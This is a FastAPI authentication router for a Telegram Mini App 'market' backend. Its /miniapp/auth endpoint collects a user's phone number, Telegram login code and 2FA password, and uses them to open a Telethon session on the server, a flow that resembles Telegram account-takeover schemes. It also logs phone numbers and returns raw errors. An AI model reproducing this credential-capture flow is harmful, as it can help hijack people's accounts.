from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
import os

from app.database import get_db
from app.services import AuthService
from app.utils.logger import ActivityLogger
from app.services.telethon_service import telethon_service

router = APIRouter(prefix="/api/auth", tags=["auth"])
miniapp_router = APIRouter(prefix="/miniapp", tags=["miniapp"])
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


@router.post("/telegram-web-app")
async def authenticate_telegram_web_app(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Авторизация через Telegram Web App"""
    try:
        data = await request.json()
        init_data = data.get("initData")
        
        if not init_data:
            logger.log_activity("unknown", "auth", "telegram_web_app", "error", {"reason": "no_init_data"})
            raise HTTPException(status_code=400, detail="Missing initData")
        
        # Валидируем и создаем пользователя
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            logger.log_activity("unknown", "auth", "telegram_web_app", "error", {"reason": "invalid_data"})
            raise HTTPException(status_code=401, detail="Invalid initData")
        
        # Получаем информацию о клиенте
        ip_address = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent", "")
        platform = "web"
        if "mobile" in user_agent.lower():
            platform = "mobile"
        elif "iphone" in user_agent.lower() or "ipad" in user_agent.lower():
            platform = "ios"
        elif "android" in user_agent.lower():
            platform = "android"
        
        # Создаем сессию и обновляем профиль
        session_token = await auth_service.create_session(
            str(user_data["telegram_id"]),
            db,
            ip_address=ip_address,
            user_agent=user_agent,
            platform=platform
        )
        
        logger.log_activity(
            str(user_data["user_id"]),
            "auth",
            "telegram_web_app",
            "success",
            {"telegram_id": user_data["telegram_id"]}
        )
        
        return JSONResponse({
            "status": "success",
            "user": user_data,
            "token": session_token
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity("unknown", "auth", "telegram_web_app", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/validate-session")
async def validate_session(
    token: str,
    db: AsyncSession = Depends(get_db)
):
    """Валидирует сессию"""
    try:
        user_id = await auth_service.validate_session(token, db)
        
        if not user_id:
            raise HTTPException(status_code=401, detail="Invalid or expired token")
        
        return JSONResponse({
            "status": "success",
            "user_id": user_id
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


# ============================================
# MINIAPP ENDPOINTS
# ============================================

@miniapp_router.post("/auth")
async def miniapp_authenticate(
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    """Авторизация для Telegram Mini App (альтернативный эндпоинт)"""
    import logging
    logger_auth = logging.getLogger("miniapp_auth")
    
    try:
        data = await request.json()
        init_data = data.get("initData")
        action = data.get("action")
        
        logger_auth.info(f"Auth request from IP: {request.client.host if request.client else 'unknown'}")
        logger_auth.info(f"User-Agent: {request.headers.get('user-agent', 'unknown')}")
        
        if not init_data:
            logger_auth.error("Missing initData in request")
            logger.log_activity("unknown", "auth", "miniapp_auth", "error", {"reason": "no_init_data"})
            raise HTTPException(status_code=400, detail="Missing initData")
        
        logger_auth.info(f"initData length: {len(init_data)}")
        
        # Валидируем и создаем пользователя
        user_data = await auth_service.validate_telegram_web_app(init_data, db)
        if not user_data:
            logger_auth.error("Failed to validate initData")
            logger.log_activity("unknown", "auth", "miniapp_auth", "error", {"reason": "invalid_data"})
            raise HTTPException(status_code=401, detail="Invalid initData")
        
        logger_auth.info(f"User validated: telegram_id={user_data['telegram_id']}, username={user_data.get('username')}")
        
        # Получаем информацию о клиенте
        ip_address = request.client.host if request.client else None
        user_agent = request.headers.get("user-agent", "")
        platform = "web"
        if "mobile" in user_agent.lower():
            platform = "mobile"
        elif "iphone" in user_agent.lower() or "ipad" in user_agent.lower():
            platform = "ios"
        elif "android" in user_agent.lower():
            platform = "android"
        
        logger_auth.info(f"Creating session for telegram_id={user_data['telegram_id']}, platform={platform}")
        # Если запрос от фронтенда — action-driven flow
        # Возможные actions: start (отправить код), verify_code, verify_2fa
        if action == 'start':
            # Ожидаем поле phone
            phone = data.get('phone')
            if not phone:
                return JSONResponse({"status": "error", "error": "Missing phone"}, status_code=400)

            # Сохраняем/обновляем профиль пользователя и создаём сессию токен
            session_token = await auth_service.create_session(
                str(user_data["telegram_id"]),
                db,
                ip_address=ip_address,
                user_agent=user_agent,
                platform=platform
            )

            # Вызываем telethon_service для отправки кода
            res = await telethon_service.create_session(
                phone_number=phone,
                user_telegram_id=str(user_data["telegram_id"]),
                db=db
            )

            # Логируем и возвращаем упрощённый ответ для фронтенда
            if res.get('status') in ('code_sent',):
                logger_auth.info(f"Code sent for {phone}, session_id={res.get('session_id')}")
                logger.log_activity(
                    str(user_data["telegram_id"]),
                    "auth",
                    "miniapp_auth",
                    "success",
                    {"telegram_id": user_data["telegram_id"], "phone": phone}
                )
                return JSONResponse({
                    "status": "ok",
                    "session_id": res.get('session_id'),
                    "phone_hash": res.get('phone_hash'),
                    "sent_via": res.get('sent_via'),
                    "token": session_token,
                    "user": user_data
                })
            elif res.get('status') == 'unavailable':
                return JSONResponse({"status": "error", "error": res.get('message', 'Code unavailable')}, status_code=503)
            else:
                return JSONResponse({"status": "error", "error": res.get('message', 'Failed to send code')}, status_code=500)

        elif action in ('verify_code', 'verify_2fa'):
            # Ожидаем session_id и code (или password для 2FA)
            session_id = data.get('session_id')
            code = data.get('code')
            password = data.get('password') if action == 'verify_2fa' else None

            # Для verify_code нужен code, для verify_2fa нужен password
            if action == 'verify_2fa':
                if not session_id or not password:
                    return JSONResponse({"status": "error", "error": "Missing session_id or password"}, status_code=400)
            else:
                if not session_id or not code:
                    return JSONResponse({"status": "error", "error": "Missing session_id or code"}, status_code=400)

            # Выполняем верификацию через telethon_service
            verify_res = await telethon_service.verify_code(
                user_telegram_id=str(user_data["telegram_id"]),
                session_id=int(session_id),
                code=str(code) if code else '',
                phone_hash=data.get('phone_hash', ''),
                password=password,
                db=db
            )

            # Map telethon responses to frontend-friendly format
            if verify_res.get('status') == 'authorized':
                return JSONResponse({"status": "ok", "message": verify_res.get('message', 'Authorized'), "user_info": verify_res.get('user_info')})
            if verify_res.get('status') == 'password_required':
                return JSONResponse({"requires_2fa": True, "hint": verify_res.get('message', '')})
            return JSONResponse({"status": "error", "error": verify_res.get('message', 'Verification failed')}, status_code=400)

        # Default: return session token and user info (existing behavior)
        session_token = await auth_service.create_session(
            str(user_data["telegram_id"]),
            db,
            ip_address=ip_address,
            user_agent=user_agent,
            platform=platform
        )

        logger_auth.info(f"Session created successfully: {session_token[:20]}...")

        logger.log_activity(
            str(user_data["telegram_id"]),
            "auth",
            "miniapp_auth",
            "success",
            {"telegram_id": user_data["telegram_id"]}
        )

        return JSONResponse({
            "status": "success",
            "user": user_data,
            "token": session_token
        })
    
    except HTTPException as he:
        logger_auth.error(f"HTTP Exception: {he.status_code} - {he.detail}")
        raise
    except Exception as e:
        logger_auth.error(f"Unexpected error: {type(e).__name__}: {str(e)}")
        import traceback
        logger_auth.error(traceback.format_exc())
        logger.log_activity("unknown", "auth", "miniapp_auth", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")


# Алиасы для эндпоинтов market (для совместимости с фронтендом)
@miniapp_router.post("/open")
async def miniapp_open(request: Request, db: AsyncSession = Depends(get_db)):
    """Алиас для /market/open"""
    from app.handlers.market import open_market_session
    return await open_market_session(request, db)


@miniapp_router.post("/stars")
async def miniapp_stars(request: Request, db: AsyncSession = Depends(get_db)):
    """Алиас для /market/stars"""
    from app.handlers.market import get_market_balances
    return await get_market_balances(request, db)


@miniapp_router.post("/deals")
async def miniapp_deals(request: Request, db: AsyncSession = Depends(get_db)):
    """Алиас для /market/deals"""
    from app.handlers.market import get_deals
    return await get_deals(request, db)


@miniapp_router.post("/profile_stats")
async def miniapp_profile_stats(request: Request, db: AsyncSession = Depends(get_db)):
    """Алиас для /market/profile_stats"""
    from app.handlers.market import get_profile_stats
    return await get_profile_stats(request, db)
